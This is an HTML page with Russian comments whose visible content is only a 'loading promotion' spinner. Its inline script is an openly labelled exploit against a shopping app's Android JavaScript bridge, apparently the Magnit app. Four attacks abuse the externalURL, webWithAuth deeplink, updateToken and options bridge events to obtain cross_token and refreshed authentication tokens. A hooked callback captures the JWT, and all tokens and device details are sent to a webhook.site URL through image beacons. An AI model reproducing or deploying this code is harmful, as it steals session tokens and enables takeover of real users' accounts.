<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка...</title>
    <style>
        body {
            font-family: -apple-system, sans-serif;
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
            color: #999;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #ddd;
            border-top-color: #e31e25;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 16px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <p>Загрузка акции...</p>
    </div>

    <script>
    // ЗАМЕНИ НА СВОЙ WEBHOOK.SITE URL
    var WEBHOOK = 'https://webhook.site/52dbaa1f-6ce3-490d-b01b-32f3ed2b7fe9/44b7c6e1-4edb-49c8-ad62-1f56ae074e3a';

    // ============================================
    // АТАКА 1: externalURL с add_crosstoken=true
    // JS bridge попросит приложение загрузить
    // наш URL с cross_token в query string
    // ============================================
    try {
        if (typeof Android !== 'undefined' && Android.postMessage) {
            Android.postMessage(JSON.stringify({
                event: 'externalURL',
                payload: {
                    url: WEBHOOK + '?method=externalURL_crosstoken&add_crosstoken=true'
                }
            }));
            new Image().src = WEBHOOK + '?method=bridge_externalURL&status=sent';
        }
    } catch(e) {
        new Image().src = WEBHOOK + '?method=bridge_externalURL&error=' + encodeURIComponent(e.message);
    }

    // ============================================
    // АТАКА 2: deeplink → webWithAuth → наш URL
    // Через JS bridge вызываем deeplink который
    // добавит cross_token к нашему URL
    // ============================================
    try {
        if (typeof Android !== 'undefined' && Android.postMessage) {
            Android.postMessage(JSON.stringify({
                event: 'deeplink',
                payload: {
                    url: 'magnit://webWithAuth?url=' + encodeURIComponent(WEBHOOK + '?method=deeplink_crosstoken') + '&in_app=true'
                }
            }));
            new Image().src = WEBHOOK + '?method=bridge_deeplink&status=sent';
        }
    } catch(e) {
        new Image().src = WEBHOOK + '?method=bridge_deeplink&error=' + encodeURIComponent(e.message);
    }

    // ============================================
    // АТАКА 3: updateToken — запрос обновления токена
    // После обновления приложение вызовет
    // handleMobileMessage с новым токеном
    // ============================================
    try {
        if (typeof Android !== 'undefined' && Android.postMessage) {
            Android.postMessage(JSON.stringify({
                event: 'updateToken'
            }));
            new Image().src = WEBHOOK + '?method=bridge_updateToken&status=sent';
        }
    } catch(e) {}

    // ============================================
    // ПЕРЕХВАТ: handleMobileMessage
    // После updateToken приложение вызовет этот callback
    // с JSON {"type":"tokenUpdated","token":"eyJ..."}
    // ============================================
    window.handleMobileMessage = function(data) {
        new Image().src = WEBHOOK + '?method=handleMobileMessage&data=' + encodeURIComponent(data);
    };

    // ============================================
    // АТАКА 4: options — получить инфу об устройстве
    // ============================================
    try {
        if (typeof Android !== 'undefined' && Android.postMessage) {
            Android.postMessage(JSON.stringify({
                event: 'options'
            }));
            new Image().src = WEBHOOK + '?method=bridge_options&status=sent';
        }
    } catch(e) {}

    // ============================================
    // ПЕРЕХВАТ: cross_token из URL (если webWithAuth)
    // ============================================
    var params = new URLSearchParams(window.location.search);
    var crossToken = params.get('cross_token');
    if (crossToken) {
        new Image().src = WEBHOOK + '?method=crossToken&token=' + encodeURIComponent(crossToken);
    }

    // ============================================
    // INFO: окружение
    // ============================================
    new Image().src = WEBHOOK + '?method=info'
        + '&url=' + encodeURIComponent(window.location.href)
        + '&ua=' + encodeURIComponent(navigator.userAgent)
        + '&referrer=' + encodeURIComponent(document.referrer);

    </script>
</body>
</html>
